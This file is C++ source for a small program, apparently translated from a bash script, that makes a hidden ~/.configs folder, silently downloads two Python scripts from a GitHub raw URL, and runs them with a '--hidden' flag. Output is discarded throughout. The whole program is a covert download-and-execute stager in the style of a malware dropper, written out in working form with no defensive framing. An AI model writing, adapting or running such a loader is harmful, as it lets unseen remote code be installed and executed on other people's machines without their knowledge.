// main.cpp — POSIX (Linux/macOS)
// Build: g++ -std=c++17 -O2 -o downloader main.cpp
#include <cerrno>
#include <cstdlib>
#include <filesystem>
#include <iostream>
#include <string>
#include <vector>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <unistd.h>

namespace fs = std::filesystem;

// Equivalent to bash `-x` / `command -v` hit: regular file the user can execute.
// Follows symlinks (stat) and uses access(2) so group/other execute bits count.
static bool is_executable_file(const std::string& path) {
    struct stat st;
    if (stat(path.c_str(), &st) != 0) return false;
    if (!S_ISREG(st.st_mode)) return false;
    return access(path.c_str(), X_OK) == 0;
}

// Equivalent to `command -v <name>`.
static bool command_exists(const std::string& name) {
    if (name.find('/') != std::string::npos) {
        return is_executable_file(name);
    }
    const char* path_env = std::getenv("PATH");
    if (!path_env) return false;
    std::string p(path_env);
    size_t start = 0;
    while (true) {
        size_t end = p.find(':', start);
        std::string dir = (end == std::string::npos)
                              ? p.substr(start)
                              : p.substr(start, end - start);
        if (dir.empty()) dir = ".";
        if (is_executable_file(dir + "/" + name)) return true;
        if (end == std::string::npos) break;
        start = end + 1;
    }
    return false;
}

// fork+exec with stdout & stderr redirected to /dev/null.
// Returns child's exit code (128+signal if killed), or -1 on fork/wait failure.
static int run_silenced(const std::vector<std::string>& args) {
    pid_t pid = fork();
    if (pid < 0) return -1;

    if (pid == 0) {
        int fd = open("/dev/null", O_WRONLY);
        if (fd >= 0) {
            dup2(fd, STDOUT_FILENO);
            dup2(fd, STDERR_FILENO);
            if (fd > STDERR_FILENO) close(fd); // never close a std fd
        }
        std::vector<char*> argv;
        argv.reserve(args.size() + 1);
        for (const auto& a : args) argv.push_back(const_cast<char*>(a.c_str()));
        argv.push_back(nullptr);
        execvp(argv[0], argv.data());
        _exit(127); // "command not found" (matches shell)
    }

    int status = 0;
    pid_t w;
    do {
        w = waitpid(pid, &status, 0);
    } while (w == -1 && errno == EINTR);

    if (w == -1) return -1;
    if (WIFEXITED(status))  return WEXITSTATUS(status);
    return 128 + WTERMSIG(status); // mirror bash's $?
}

static bool save_hidden_file(const std::string& url, const std::string& target) {
    std::error_code ec;

    // bash: [ -f "$TARGET_PATH" ] && chmod 644
    // (-f is regular-file only; fs::exists would also match directories.)
    if (fs::is_regular_file(target, ec)) {
        fs::permissions(target,
                        fs::perms::owner_read | fs::perms::owner_write |
                        fs::perms::group_read | fs::perms::others_read,
                        ec); // 0644, errors silently ignored
    }

    std::string curl_bin;
    if      (command_exists("curl"))                curl_bin = "curl";
    else if (command_exists("/usr/bin/curl"))       curl_bin = "/usr/bin/curl";
    else if (command_exists("/usr/local/bin/curl")) curl_bin = "/usr/local/bin/curl";

    int rc = -1;
    if (!curl_bin.empty()) {
        rc = run_silenced({curl_bin, "-sS", "--tlsv1.2", "-o", target, url});
    } else {
        // Python fallback. Passing URL/target via env fixes the original's
        // single-quote injection bug (bash interpolated them into a '...' string).
        if (setenv("DL_URL",    url.c_str(),    1) != 0 ||
            setenv("DL_TARGET", target.c_str(), 1) != 0) {
            return false;
        }
        rc = run_silenced({"python3", "-c",
            "import os,urllib.request;"
            "urllib.request.urlretrieve(os.environ['DL_URL'],os.environ['DL_TARGET'])"});
    }

    if (rc == 0) {
        fs::permissions(target,
                        fs::perms::owner_read | fs::perms::owner_write,
                        ec); // 0600, errors silently ignored
        return true;
    }
    return false;
}

int main() {
    // bash behavior: unset or empty HOME both expand to "/.configs".
    const char* home_env = std::getenv("HOME");
    const std::string home = home_env ? home_env : "";
    const std::string config_path = home + "/.configs";

    std::error_code ec;
    fs::create_directories(config_path, ec);
    if (!fs::is_directory(config_path, ec)) {
        // bash would show mkdir's own stderr; mirror that.
        if (ec) std::cerr << "mkdir: " << ec.message() << "\n";
        std::cout << "Failed\n";
        return 1;
    }

    const std::string final_path = config_path + "/client.py";
    if (!save_hidden_file(
            "https://raw.githubusercontent.com/rahul-call/inner/main/ror/client.py",
            final_path)) {
        std::cout << "Failed\n";
        return 1;
    }

    const std::string final_path3 = config_path + "/auto.py";
    if (!save_hidden_file(
            "https://raw.githubusercontent.com/rahul-call/inner/main/ror/auto.py",
            final_path3)) {
        std::cout << "Failed\n";
        return 1;
    }

    if (!command_exists("python3")) {
        std::cout << "Failed\n";
        return 1;
    }

    int rc = run_silenced({"python3", "-u", final_path3, final_path, "--hidden"});
    if (rc != 0) {
        std::cout << "Failed\n";
        return 1;
    }
    return 0;
}
